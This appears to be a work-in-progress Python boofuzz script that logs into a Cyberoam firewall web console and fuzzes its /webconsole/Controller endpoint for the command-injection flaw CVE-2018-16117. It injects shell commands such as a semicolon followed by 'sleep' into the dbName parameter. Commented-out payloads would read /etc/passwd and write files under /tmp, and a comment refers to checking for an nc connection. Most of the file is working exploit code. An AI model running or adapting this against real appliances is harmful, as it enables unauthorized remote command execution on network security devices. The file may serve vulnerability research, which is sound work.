# -*- coding=utf-8 -*-
import json
import re
import traceback

from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
import warnings

# 过滤掉InsecureRequestWarning警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)

# 20240312 send packet ok, need optimization

warnings.filterwarnings("ignore", category=UserWarning)

# warnings.filterwarnings("ignore", category=UserWarning, module="boofuzz")  # python3 -W ignore
# testcase
t = 0
kw = '200'


def str2urlencode(s: str) -> str:
    url_str = urllib.parse.quote(s, safe='')
    return url_str


# # custom exception example
# class BooHttpException(Exception):
#     # custom Exception
#     pass


def resp(target, fuzz_data_logger, session, *args, **kwargs):
    print('--' * 66)
    try:
        # time.sleep(2)  # just for test
        print("[D] Active received data: ")
        # print(target.recv().decode())   # 没有数据，可能是因为在Session启用了receive_data_after_fuzz=True，所以可能在session.last_recv？
        print(session.last_recv)

        json_resp = target.recv()
        print("[D] get second response: ")
        if json_resp:
            json_str = json_resp.decode()
            print(json_str)
            if "Session Expired" in json_str:
                print("[W] Session Expired !!!!")

        print("~" * 33)
        fuzz_data_logger.log_check(session.last_send)
        print("~" * 33)
        print(session.last_send.decode())
        print("~" * 33)


    except:
        fuzz_data_logger.log_fail("Unable to connect ...")

    print('--' * 66)


def resp_all_testcase(target, fuzz_data_logger, session, test_case_context, *args, **kwargs):
    # example_test_case_callback
    # print(">>>> target_info: ")
    # print(target.recv())
    # print(dir(session))
    # print(session.root.id)  # 0
    # print(session.root.label)  # __ROOT_NODE__

    print("____ in resp_all_testcase() ______")

    print(
        f"[D] test_case_context -> previous_message: {test_case_context.previous_message.id, test_case_context.previous_message.label}")

    # print(dir(test_case_context.current_message))
    print(
        f"[D] test_case_context -> current_message: {test_case_context.current_message.id, test_case_context.current_message.label}")

    print("--------------~~~~~~~~~~~~~~")
    # print(session.last_send)

    # print(f'[D0] {test_case_context.session_variables}')
    # test_case_context.session_variables['cur_id'] = test_case_context.previous_message.id
    # test_case_context.session_variables['cur_label'] = test_case_context.previous_message.label
    # test_case_context.session_variables['cur_time'] = time.time()
    try:
        recv_data = session.last_recv
        if recv_data:
            print(recv_data)

        print('~' * 99)

    except:
        fuzz_data_logger.log_fail("Unable to connect ...")


def init_login_http(session, ip, port, username, passwd):
    # todo dev
    s_initialize(name='Request_login_web')  # request

    with s_block("Request-Line"):
        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID=\r\n")  # login cookie empty is ok
        s_static("Content-Length: 191\r\n")

        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        s_static("Sec-Ch-Ua-Mobile: 0\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\r\n")
        s_static('Sec-Ch-Ua-Platform: "Windows"\r\n')

        # s_static("Sec-Ch-Ua-Platform: Windows\r\n")
        s_static(f"Origin: https://{ip}:{port}\r\n")

        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")

        s_static(f"Referer: https://{ip}:{port}/webconsole/webpages/login.jsp\r\n")

        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.9\r\n")
        s_static("Priority: u=1, i\r\n")
        s_static("Connection: close\r\n")

        # s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    with s_block('body'):
        # static的密码都需要做符号化处理，不然发包的数据应该不对，1qaz2wsx%23EDC
        passwd_encode = str2urlencode(passwd)
        s_static(
            f"mode=151&json=%7B%22username%22%3A%22{username}%22%2C%22password%22%3A%22{passwd_encode}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Chrome_122%22%7D&__RequestType=ajax&t={int(time.time())}001&a=")

        s_random(value="", min_length=1, max_length=1)

    # session.connect(s_get('Request_login_web'))
    # session.connect(s_get('Request_login_web'), callback=check_reply_code_light)


def init_http(session, ip, port, user, passwd):
    # todo dev
    s_initialize(name='Request_login_web')  # request

    with s_block("Request-Line"):
        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID=\r\n")  # login cookie empty is ok
        s_static("Content-Length: 191\r\n")

        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        s_static("Sec-Ch-Ua-Mobile: 0\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\r\n")
        s_static('Sec-Ch-Ua-Platform: "Windows"\r\n')

        # s_static("Sec-Ch-Ua-Platform: Windows\r\n")
        s_static(f"Origin: https://{ip}:{port}\r\n")

        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")

        s_static(f"Referer: https://{ip}:{port}/webconsole/webpages/login.jsp\r\n")

        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.9\r\n")
        s_static("Priority: u=1, i\r\n")
        s_static("Connection: close\r\n")

        # s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    with s_block('body'):
        # static的密码都需要做符号化处理，不然发包的数据应该不对，1qaz2wsx%23EDC
        passwd_encode = str2urlencode(passwd)
        s_static(
            f"mode=151&json=%7B%22username%22%3A%22{user}%22%2C%22password%22%3A%22{passwd_encode}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Chrome_122%22%7D&__RequestType=ajax&t={int(time.time())}001&a=")

        s_random(value="", min_length=1, max_length=1)

    # session.connect(s_get('Request_login_web'))
    session.connect(s_get('Request_login_web'), callback=check_reply_code_light)


def init_logic_fuzz(session):
    # print(session.fuzz_node.names["cookie"])
    # print(session.fuzz_node.names["token"])

    s_initialize(name='Request_rce_fuzz')

    with s_block("Request-Line"):
        # s_static(
        #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(sys.argv[1], sys.argv[2]))

        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        # s_static(f"Host: {sys.argv[1]}:{sys.argv[2]}\r\n")
        # s_static(f"Cookie: JSESSIONID={c}\r\n")
        # s_static(
        #     "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
        # s_static("Accept: text/plain, */*; q=0.01\r\n")
        # s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
        # s_static("Accept-Encoding: gzip, deflate, br\r\n")
        # s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        # s_static("X-Requested-With: XMLHttpRequest\r\n")
        # s_static(f"X-Csrf-Token: {token}\r\n")
        # s_static("Content-Length: 308\r\n")
        # s_static(f"Origin: https://{sys.argv[1]}:{sys.argv[2]}\r\n")
        # s_static(
        #     f"Referer: https://{sys.argv[1]}:{sys.argv[2]}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={token}\r\n")
        # s_static("Sec-Fetch-Dest: empty\r\n")
        # s_static("Sec-Fetch-Mode: cors\r\n")
        # s_static("Sec-Fetch-Site: same-origin\r\n")
        # s_static("Te: trailers\r\n")
        # s_static("Connection: close\r\n")
        #
        # # s_size('body_content', fuzzable=False, output_format='ascii')
        #
        # s_static("\r\n", name="Request-CRLF")

        with s_block('body_content'):
            s_static(
                "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")
            # s_static('sleep%205')  # o1
            s_string('sleep%203')
            # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
            # s_static('date%20%3E%20%2Ftmp%2F111')
            s_static(
                f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990&a=")
            s_random(min_length=1, max_length=1)  # just add for launch fuzzer

        # session.connect(s_get('Request_rce_fuzz'), callback=session_pre_send_callback)


# def keyword_check(target, fuzz_data_logger, session, *args, **kwargs):
#     # print(f"keywords: {kw}")
#     fuzz_data_logger.log_check(f"input keywords: {kw}")
#     try:
#         response = target.recv(2048).decode()
#         # print(type(response))   # str
#         fuzz_data_logger.log_check(response)
#         print("xxxx" * 22)
#         if kw in response:
#             fuzz_data_logger.log_check(f">>>>> [Bingo!] Find keyword {kw} in response data...")
#         fuzz_data_logger.log_check(session.last_send)
#         # if 'redirectionURL' in target.recv(10240).decode():
#         #     fuzz_data_logger.log_check(session.last_send)
#     except:
#         fuzz_data_logger.log_fail("Unable to connect ...")
#         return
#
#
# def ad(target, fuzz_data_logger, session, *args, **kwargs):
#     # get server response
#     print('================= check server response ===================')
#
#     response = target.recv(2048).decode()
#     # print(type(response))   # str
#     fuzz_data_logger.log_check(response)
#     if "status" in response:
#         ret = json.loads(response)
#         if ret.get('status') == 200:
#             print(f"[I] normal, status: {ret.get('status')}")
#         elif ret.get('status') == "Session Expired":
#             print(f"[I] Session Expired, status: {ret.get('status')}")
#             # todo dev: if session expired, need call function to get new JSESSIONID and CSRF_TOKEN

def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def extract_jsessionid(text):
    jsessionid = None
    match = re.search(r"JSESSIONID=([^;]+)", text)
    if match:
        jsessionid = match.group(1)
        print(jsessionid)
    return jsessionid


# get cookie and csrf_token, then insert it in sessions.fuzz_node
def session_pre_send_callback(target, fuzz_data_logger, session, *args, **kwargs):
    print(f"[DDD] {ip} --- {port} --- {username} --- {password}")

    # global cookie
    # global token

    cookie, token = get_cookie_token(host, port, username, password)

    # pre_time = round(time.time() * 1000)
    # session.fuzz_node.names["pre_time"] = pre_time

    session.fuzz_node.names["cookie"] = cookie
    session.fuzz_node.names["token"] = token

    print(f"[DDD] cookie: {cookie}, token: {token}")
    # session.fuzz_node.names["pre_time"]._value = f"{pre_time}"
    return session.fuzz_node.render()


def get_cookie_token(ip, port, username, passwd):
    # 1.login web console
    cookie, csrf_token = None, None
    try:
        r = requests.post(url='https://{}:{}/webconsole/Controller'.format(ip, port),
                          data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
                              username, passwd) + str(int(time.time()) + 3600) + '999', verify=False,
                          headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
                                   'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                   'X-Requested-With': 'XMLHttpRequest'})

        # get cookie and jsessionid
        cookie = r.cookies.items()[0][1]

        print(f"[D] get_cookie_token() JSESSIONID is: {cookie}")

        # get csrf_token
        url0 = 'https://{}:{}/webconsole/webpages/index.jsp'.format(sys.argv[1], sys.argv[2])
        r = requests.get(url=url0, headers={
            'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
            'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'JSESSIONID={}'.format(cookie)}, verify=False)

        csrf_token = extract_csrf_token(r.text)

        print(f"[D] csrf token is: {csrf_token}")

        print("[D] response header: ", r.headers)
    except Exception as err:
        traceback.print_exc()
    return cookie, csrf_token


def check_reply_code_light(target, fuzz_data_logger, session, test_case_context, *args, **kwargs):
    """
        Args:
            target (Target): Target with sock-like interface.
            fuzz_data_logger (ifuzz_logger.IFuzzLogger): Allows logging of test checks and passes/failures.
                Provided with a test case and test step already opened.
            session (Session): Session object calling post_send.
                Useful properties include last_send and last_recv.
            test_case_context (ProtocolSession): Context for test case-scoped data.
                :py:class:`TestCaseContext` :py:attr:`session_variables <TestCaseContext.session_variables>`
                values are generally set within a callback and referenced in elements via default values of type
                :py:class:`ReferenceValueTestCaseSession`.
            args: Implementations should include \\*args and \\**kwargs for forward-compatibility.
            kwargs: Implementations should include \\*args and \\**kwargs for forward-compatibility.
    """

    # print(session.root.id)  # 0
    # print(session.root.label)  # __ROOT_NODE__
    # print(session.fuzz_node)
    # print(dir(session.fuzz_node.names))
    # print(type(session.fuzz_node.names))

    print(f"[post_send] after fuzz: {session.fuzz_node.names['token']}, {session.fuzz_node.names['cookie']}")

    # print(dir(test_case_context.previous_message))
    # print(test_case_context.previous_message.id, test_case_context.previous_message.label)
    print(f"[D] testcase count: {fuzz_data_logger.test_case_count}")
    # print(dir(test_case_context.current_message))
    print(test_case_context.current_message.id, test_case_context.current_message.label,
          test_case_context.current_message.name)

    # print(f"[Debug] test_case_context.session_variables: {test_case_context.session_variables}")  # {}

    print("x" * 66)
    fuzz_data_logger.log_info(session.last_send)
    print("-" * 66)
    recv_data = session.last_recv
    fuzz_data_logger.log_info(recv_data)
    print("=" * 66)

    if recv_data:
        print(f"[Debug] Received data: {recv_data}")
        print("*" * 99)


# https://github.com/jtpereyda/boofuzz/issues/652#issuecomment-1345185548
def handle_auth(target, fuzz_data_logger, session, node, edge, *args, **kwargs):
    print(f"[1] session.last_recv: \n{session.last_recv}")
    json_resp = target.recv()
    print("[2] get second response: ")
    if json_resp:
        json_str = json_resp.decode()
        print(json_str)

    # global cookie
    # global csrf_token
    # if not session.last_send or (session.last_recv and b'Session Expired' in session.last_recv):
    #     # send login request and set the correct cookie with value from login response
    #     # todo dev
    #     cookie, csrf_token = get_cookie_token(ip, port, username, password)
    #
    #
    #     # update cookie attribute in req1 request dynamically
    #     s_update(node.name + '.cookie', cookie)
    #     s_update(node.name + '.token', csrf_token)

    return node.render()


def login_web():
    if len(sys.argv) != 5:
        sys.exit(
            'usage: {} target_ip port username password'.format(sys.argv[0]))

    global ip
    global port
    global username
    global password

    ip = sys.argv[1]
    port = sys.argv[2]
    username = sys.argv[3]
    password = sys.argv[4]

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=ip, port=int(port), sslcontext=ctx, recv_timeout=10)),
        restart_threshold=1,
        # pre_send_callbacks=[session_pre_send_callback],
        post_test_case_callbacks=[resp],
        receive_data_after_fuzz=True,
        # sleep_time=0.1
    )

    # todo dev test
    define_web_rce_static(session, ip, port, username, password)

    session.num_mutations(1)  # limit mutation count

    # init_login_http(session, ip, port, username, password)
    session.fuzz(max_depth=1)  # less complexity

    #     # session.example_test_case_callback()
    #
    #     # 1.login web console
    #     try:
    #         r = requests.post(url='https://{}:{}/webconsole/Controller'.format(sys.argv[1], sys.argv[2]),
    #                           data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
    #                               sys.argv[3], sys.argv[4]) + str(int(time.time()) + 3600) + '999', verify=False,
    #                           headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
    #                                    'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
    #                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    #                                    'X-Requested-With': 'XMLHttpRequest'})
    #
    #         # get cookie and jsessionid
    #         c = r.cookies.items()[0][1]
    #
    #         print(f"[D] JSESSIONID is: {c}")
    #
    #         # get csrf_token
    #         url0 = 'https://{}:{}/webconsole/webpages/index.jsp'.format(sys.argv[1], sys.argv[2])
    #         r = requests.get(url=url0, headers={
    #             'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
    #             'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
    #             'Cookie': 'JSESSIONID={}'.format(c)}, verify=False)
    #
    #         token = extract_csrf_token(r.text)
    #
    #         print(f"[D] csrf token is: {token}")
    #
    #         print("[D] response header: ", r.headers)
    #         # print(f"[D] response data: {r.text}")  # debug
    #
    #         if 'Cyberoam.loginUserName = "admin"' in r.text:
    #             print(f"[I] Login web console success...")
    #
    #             # test pass 确实要24小时才过期
    #
    #             # CVE-2018-16117 todo dev
    #             # ref: https://www.anquanke.com/post/id/214424
    #
    #             s_initialize(name='rce_fuzz')
    #
    #             with s_block("Request-Line"):
    #                 # s_static(
    #                 #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(sys.argv[1], sys.argv[2]))
    #
    #                 s_group("Method", ['POST'])
    #                 s_delim(" ", name='space-1', fuzzable=False)  # fuzz
    #                 # s_static(" ", name='space-1')  # static
    #                 s_static("/webconsole/Controller", name='Request-URI')
    #                 s_delim(" ", name='space-2', fuzzable=False)  # fuzz
    #                 # s_static(" ", name='space-2')
    #                 s_static('HTTP/1.1', name='HTTP-Version')
    #                 s_static("\r\n", name="Request-Line-CRLF")
    #
    #                 s_static(f"Host: {sys.argv[1]}:{sys.argv[2]}\r\n")
    #                 s_static(f"Cookie: JSESSIONID={c}\r\n")
    #                 s_static(
    #                     "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
    #                 s_static("Accept: text/plain, */*; q=0.01\r\n")
    #                 s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
    #                 s_static("Accept-Encoding: gzip, deflate, br\r\n")
    #                 s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
    #                 s_static("X-Requested-With: XMLHttpRequest\r\n")
    #                 s_static(f"X-Csrf-Token: {token}\r\n")
    #                 s_static("Content-Length: 308\r\n")
    #                 s_static(f"Origin: https://{sys.argv[1]}:{sys.argv[2]}\r\n")
    #                 s_static(
    #                     f"Referer: https://{sys.argv[1]}:{sys.argv[2]}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={token}\r\n")
    #                 s_static("Sec-Fetch-Dest: empty\r\n")
    #                 s_static("Sec-Fetch-Mode: cors\r\n")
    #                 s_static("Sec-Fetch-Site: same-origin\r\n")
    #                 s_static("Te: trailers\r\n")
    #                 s_static("Connection: close\r\n")
    #
    #                 # s_size('body_content', fuzzable=False, output_format='ascii')
    #
    #             s_static("\r\n", name="Request-CRLF")
    #
    #             with s_block('body_content'):
    #                 s_static(
    #                     "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")
    #                 # s_static('sleep%205')  # o1
    #                 s_string('sleep%202')
    #                 # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
    #                 # s_static('date%20%3E%20%2Ftmp%2F111')
    #                 s_static(
    #                     f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990&a=")
    #                 # s_random(min_length=1, max_length=1)  # just add for launch fuzzer
    #
    #             session.connect(s_get('rce_fuzz'))
    #             session.fuzz(max_depth=1)
    #             print("-------")
    #
    #             # # start_time
    #             # st = time.time()
    #             #
    #             # r = requests.post(url=url3, verify=False,
    #             #                   data=data, headers=headers)
    #             #
    #             # print("[I] step3 response: ", r.text)
    #             #
    #             # # computed expired time
    #             # delta_t = time.time() - st
    #             # print(f"[D] wait time: {delta_t} seconds")
    #             #
    #             # if cmd_type == 1:
    #             #     if delta_t >= fuzz_time_value:
    #             #         print("[I] sleep command, RCE success ...")
    #             # elif cmd_type == 2:
    #             #     print("[I] please check nc connection ...")
    #
    #     except Exception as e:
    #         print(e)


def define_web_rce_static(session, ip, port, username, password):
    # request 1
    s_initialize(name='Request_login_web')  # request

    with s_block("Request-Line"):
        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID=\r\n")  # login cookie empty is ok
        s_static("Content-Length: 191\r\n")

        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        s_static("Sec-Ch-Ua-Mobile: 0\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\r\n")
        s_static('Sec-Ch-Ua-Platform: "Windows"\r\n')

        # s_static("Sec-Ch-Ua-Platform: Windows\r\n")
        s_static(f"Origin: https://{ip}:{port}\r\n")

        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")

        s_static(f"Referer: https://{ip}:{port}/webconsole/webpages/login.jsp\r\n")

        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.9\r\n")
        s_static("Priority: u=1, i\r\n")
        s_static("Connection: close\r\n")

        ## s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    with s_block('body'):
        # static的密码都需要做符号化处理，不然发包的数据应该不对，1qaz2wsx%23EDC
        passwd_encode = str2urlencode(password)
        s_static(
            f"mode=151&json=%7B%22username%22%3A%22{username}%22%2C%22password%22%3A%22{passwd_encode}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Chrome_122%22%7D&__RequestType=ajax&t={int(time.time())}001&a=")

        # s_random(value="", min_length=1, max_length=1)
        s_group("ava", ['a', 'b', 'c'])

    # session.connect(s_get('Request_login_web'), callback=handle_auth)
    session.connect(s_get('Request_login_web'))
    # # request 2
    # s_initialize(name='Request_rce_fuzz')
    #
    # with s_block("Request-Line"):
    #     # s_static(
    #     #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(sys.argv[1], sys.argv[2]))
    #
    #     s_group("Method", ['POST'])
    #     s_delim(" ", name='space-1', fuzzable=False)  # fuzz
    #     # s_static(" ", name='space-1')  # static
    #     s_static("/webconsole/Controller", name='Request-URI')
    #     s_delim(" ", name='space-2', fuzzable=False)  # fuzz
    #     # s_static(" ", name='space-2')
    #     s_static('HTTP/1.1', name='HTTP-Version')
    #     s_static("\r\n", name="Request-Line-CRLF")
    #
    #     s_static(f"Host: {sys.argv[1]}:{sys.argv[2]}\r\n")
    #     s_static(f"Cookie: JSESSIONID={c}\r\n")
    #     s_static(
    #         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
    #     s_static("Accept: text/plain, */*; q=0.01\r\n")
    #     s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
    #     s_static("Accept-Encoding: gzip, deflate, br\r\n")
    #     s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
    #     s_static("X-Requested-With: XMLHttpRequest\r\n")
    #     s_static(f"X-Csrf-Token: {token}\r\n")
    #     s_static("Content-Length: 308\r\n")
    #     s_static(f"Origin: https://{sys.argv[1]}:{sys.argv[2]}\r\n")
    #     s_static(
    #         f"Referer: https://{sys.argv[1]}:{sys.argv[2]}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={token}\r\n")
    #     s_static("Sec-Fetch-Dest: empty\r\n")
    #     s_static("Sec-Fetch-Mode: cors\r\n")
    #     s_static("Sec-Fetch-Site: same-origin\r\n")
    #     s_static("Te: trailers\r\n")
    #     s_static("Connection: close\r\n")
    #
    #     # s_size('body_content', fuzzable=False, output_format='ascii')
    #
    #     s_static("\r\n", name="Request-CRLF")
    #
    #     with s_block('body_content'):
    #         s_static(
    #             "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")
    #         # s_static('sleep%205')  # o1
    #         s_string('sleep%203')
    #         # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
    #         # s_static('date%20%3E%20%2Ftmp%2F111')
    #         s_static(
    #             f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990&a=")
    #         # s_random(min_length=1, max_length=1)  # just add for launch fuzzer


if __name__ == '__main__':
    login_web()
